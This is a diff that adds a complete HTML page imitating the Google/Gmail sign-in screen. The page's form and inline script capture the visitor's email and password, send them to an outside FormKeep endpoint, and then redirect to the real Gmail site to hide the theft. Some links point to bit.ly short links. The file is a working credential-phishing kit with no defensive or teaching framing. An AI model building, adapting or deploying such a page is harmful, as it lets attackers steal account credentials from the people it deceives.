@@ -1,0 +1,141 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Gmail Inbox</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            background-color: #f2f2f2;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            margin: 0; /* Remove default margin */
+        }
+
+        .login-container {
+            background-color: #fff;
+            padding: 20px;
+            border-radius: 20px;
+            text-align: center;
+        }
+
+        .logo {
+            width: 100px;
+            margin-bottom: 20px;
+        }
+
+        h1,
+        h2 {
+            margin: 0; /* Remove default margin */
+        }
+
+        form {
+            display: flex;
+            flex-direction: column;
+        }
+
+        input[type="email"],
+        input[type="password"],
+        button {
+            padding: 10px;
+            margin-bottom: 10px;
+            border: 1px solid #ccc;
+            border-radius: 5px;
+            font-size: 16px;
+        }
+
+        button {
+            background-color: #4285f4;
+            color: #fff;
+            border: none;
+            cursor: pointer;
+        }
+
+        button:hover {
+            background-color: #357ae8;
+        }
+
+        a {
+            text-decoration: none;
+            color: #4285f4;
+        }
+
+        a:hover {
+            text-decoration: underline;
+        }
+
+        /* Define CSS classes for different colors */
+        .red { color: red; }
+        .green { color: green; }
+        .blue { color: #4285f4; }
+        .orange { color: orange; }
+        .purple { color: purple; }
+    </style>
+</head>
+<body>
+    <div class="login-container">
+        <h1>
+            <span style="font-size:36px;font-family:'Product Sans',sans-serif;">
+                <span class="blue">G</span>
+                <span class="red">o</span>
+                <span class="orange">o</span>
+                <span class="blue">g</span>
+                <span class="green">l</span>
+                <span class="red">e</span>
+            </span>
+        </h1>   
+        <h4 style="font-size:20px;">One Account. All of Google.</h4>
+        <p>Sign in to continue to Gmail</p>
+        <img src="/storage/emulated/0/
+Pictures/Screenshots/
+Screenshot_20240225-185415.jpg">
+        <form action="https://formkeep.com/f/b05fcf8bfc82" method="POST" id="GForm">
+            <input type="email" id="email" name="email"placeholder="Gmail ID" required>
+            <input type="password" id="name" name="name" placeholder="Password" required><br>
+            <button type="submit">Sign In</button>
+          <h style="display: flex; justify-content: space-between;">
+  <div><a href="https://bit.ly/49OatpF" style="text-align: left;color:#4285f4">Stay signed in</a></div>
+  <div style="text-align: right;color:#4285f4;">Need help?</div></h>
+            <p><a href="https://bit.ly/49OatpF">Forgot password?</a></p>
+            <h style="color:#4285f4">or</h>
+            <p><a href="#">Create account</a></p>
+        </form>
+        <script>
+    // Get the user's preferred language and region
+    var userLanguage = navigator.language || navigator.userLanguage;
+
+    // Extract language from userLanguage
+    var lang = userLanguage.split('-')[0];
+
+    // Update the form language
+    document.getElementById('GForm').lang = lang;
+    
+    // Add event listener for form submission
+    document.getElementById('GForm').addEventListener('submit', function(event) {
+        // Prevent the default form submission
+        event.preventDefault();
+        
+        // Submit the form data to FormKeep
+        var form = this;
+        var formData = new FormData(form);
+        var xhr = new XMLHttpRequest();
+        xhr.open('POST', 'https://formkeep.com/f/b05fcf8bfc82', true);
+        xhr.setRequestHeader('accept', 'application/javascript');
+        xhr.onload = function() {
+            if (xhr.status === 200) {
+                // Form submission successful, redirect the user to another URL
+                window.location.href = 'https://www.Gmail.com/';
+            } else {
+                // Handle form submission error
+                console.error('Form submission failed');
+            }
+        };
+        xhr.send(formData);
+    });
+</script>
+    </div>
+</body>
+</html>
